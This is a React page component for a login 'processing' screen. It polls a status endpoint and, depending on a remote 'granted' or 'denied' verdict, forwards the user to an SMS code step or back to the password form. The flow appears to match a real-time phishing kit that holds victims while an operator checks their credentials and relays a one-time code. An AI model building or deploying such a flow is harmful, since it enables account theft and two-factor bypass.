import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { Loader2, Clock, Shield } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { Logo } from "@/components/Logo";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

export default function LoadingPage() {
  const [location, setLocation] = useLocation();
  const [requestId, setRequestId] = useState<string>("");

  // Extract request ID from URL params
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get("requestId") || "";
    setRequestId(id);
  }, []);

  // Poll for status updates every 2 seconds
  const { data: status } = useQuery({
    queryKey: ["/api/auth/status", requestId],
    enabled: !!requestId,
    refetchInterval: 2000, // Poll every 2 seconds
    retry: false,
  });

  // Handle status changes
  useEffect(() => {
    if (status && (status as any).status) {
      if ((status as any).status === "granted") {
        // Redirect to SMS verification
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get("username") || "";
        setLocation(`/sms?username=${encodeURIComponent(username)}`);
      } else if ((status as any).status === "denied") {
        // Redirect back to password step with error and keep username
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get("username") || "";
        setLocation(
          `/login?username=${encodeURIComponent(
            username
          )}&error=incorrect_password`
        );
      }
    }
  }, [status, setLocation]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 via-white to-slate-100">
      {/* Company Header */}
      <header className="auth-page-header border-b border-slate-200 bg-white/70 backdrop-blur">
        <Logo />
      </header>

      <div role="main" className="auth-form-container flex items-center justify-center py-10">
        <Card className="w-full max-w-md border-slate-200 shadow-lg shadow-slate-100">
          <CardHeader className="pb-4">
            <CardTitle className="text-center text-xl font-semibold text-slate-900">
              Processing your request
            </CardTitle>
            <p className="mt-2 text-center text-sm text-slate-500">
              Please wait while we verify your credentials and process your login.
            </p>
          </CardHeader>

          <CardContent className="space-y-8">
            {/* Loading Animation */}
            <div className="flex justify-center">
              <div className="flex h-20 w-20 items-center justify-center rounded-full bg-blue-50">
                <Loader2 className="h-10 w-10 animate-spin text-blue-600" />
              </div>
            </div>

            {/* Status Steps */}
            <div className="space-y-4 rounded-lg border border-slate-200 bg-slate-50/80 p-5">
              <div className="flex items-center gap-3 text-sm">
                <div className="flex h-6 w-6 items-center justify-center rounded-full bg-green-100">
                  <div className="h-3 w-3 rounded-full bg-green-600" />
                </div>
                <span className="font-medium text-green-800">
                  Credentials received
                </span>
              </div>

              <div className="flex items-center gap-3 text-sm">
                <div className="flex h-6 w-6 items-center justify-center rounded-full bg-blue-100">
                  <Loader2 className="h-3 w-3 animate-spin text-blue-600" />
                </div>
                <span className="font-medium text-blue-800">
                  Verifying your identity&hellip;
                </span>
              </div>

              <div className="flex items-center gap-3 text-sm text-slate-500">
                <div className="flex h-6 w-6 items-center justify-center rounded-full bg-slate-200">
                  <Shield className="h-3 w-3 text-slate-500" />
                </div>
                <span>Preparing secure access</span>
              </div>
            </div>

            {/* Wait Message */}
            <div className="rounded-lg border border-blue-100 bg-blue-50/80 p-4">
              <div className="flex items-start gap-3">
                <Clock className="mt-0.5 h-5 w-5 flex-shrink-0 text-blue-600" />
                <div className="text-sm text-blue-900">
                  <p className="mb-1 font-medium">
                    Please don&apos;t close this page
                  </p>
                  <p className="text-xs sm:text-sm text-blue-900/90">
                    This process usually takes only a few moments. We&apos;ll
                    redirect you automatically once verification is complete.
                  </p>
                </div>
              </div>
            </div>

            {/* Loading dots animation */}
            <div className="flex items-center justify-center space-x-2">
              <div className="h-2 w-2 animate-bounce rounded-full bg-blue-600" />
              <div
                className="h-2 w-2 animate-bounce rounded-full bg-blue-600"
                style={{ animationDelay: "0.1s" }}
              />
              <div
                className="h-2 w-2 animate-bounce rounded-full bg-blue-600"
                style={{ animationDelay: "0.2s" }}
              />
            </div>
          </CardContent>
        </Card>
      </div>

      <footer className="auth-footer">
        <div className="auth-footer-content">
          <p className="auth-footer-copyright">Copyright © 2025</p>
          <a
            className="auth-footer-privacy"
            href="#"
            target="_blank"
            data-testid="link-privacy"
          >
            Privacy
          </a>
          <a
            className="auth-footer-terms"
            href="#"
            target="_blank"
            data-testid="link-terms"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}
